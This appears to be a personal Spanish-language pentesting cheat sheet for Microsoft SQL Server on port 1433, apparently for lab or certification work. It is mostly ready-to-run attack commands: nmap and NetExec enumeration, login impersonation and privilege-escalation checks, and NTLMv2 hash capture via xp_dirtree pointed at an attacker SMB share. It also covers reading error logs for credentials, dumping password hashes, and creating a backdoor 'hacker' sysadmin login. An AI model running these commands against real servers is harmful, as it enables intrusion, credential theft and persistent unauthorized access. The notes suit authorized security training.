---
title: 1433 - Microsoft SQL Server
layout: default
---
Está todo en la página de hacktricks, importante mirar exploits para la versión

[1433 - Pentesting MSSQL - Microsoft SQL Server - HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html?highlight=sql%20server#1433---pentesting-mssql---microsoft-sql-server)

# Sin credenciales : 

```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

# Con credenciales

```bash
mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
```

Listar usuarios
```sql
select name, create_date, modify_date, type_desc as type, authentication_type_desc as authentication_type, sid from sys.database_principals where type not in ('A', 'R') order by name;
```

Listar usuarios que podemos impersonar (quizás tienen acceso a bases de datos que nosotros no tenemos)
```bash
nxc mssql 192.168.162.40 -u 'discovery' -p 'Start123!' -M enum_impersonate
```

Listar sysadmins
```sql
Use master; EXEC sp_helpsrvrolemember 'sysadmin';
```

Logins que permiten entrar al motor SQL
```bash
nxc mssql 192.168.162.40 -u 'discovery' -p 'Start123!' -M enum_logins
```

Para enumerar si un usuario al que puedo impersonar es sysadmin
```sql
EXECUTE AS LOGIN = 'hrappdb-reader' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
```

# Para ver si puedo hacer privesc

[MSSQL PrivEsc | NetExec](https://www.netexec.wiki/mssql-protocol/mssql-privesc)

```
nxc mssql <ip> -u user -p password -M mssql_priv
```

```
nxc mssql <ip> -u user -p password -M mssql_priv --local-auth
```

# Diversas pruebas con netexec :

https://www.netexec.wiki/mssql-protocol/

# Obtener hash NTLMv2

mssql lo corre el servicio sql_svc, podemos obtener su hash

```sql
EXEC xp_dirtree '\\IP\share', 1, 1
```

```bash
impacket-smbserver share ./share -smb2support
```


Si todo lo anterior falla, revisar los contenidos de la db

# ERROR LOG

Puede contener creds

```
cd C:\SQLServer\Logs
type ERRORLOG.BAK
```

# COMANDOS BÁSICOS

```sql
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

# Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;

# List table content
USE DATABASE;
SELECT * FROM TABLE;

#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;

#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;

#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'

#Enumerate links
enum_links

#Use a link
use_link [NAME]

```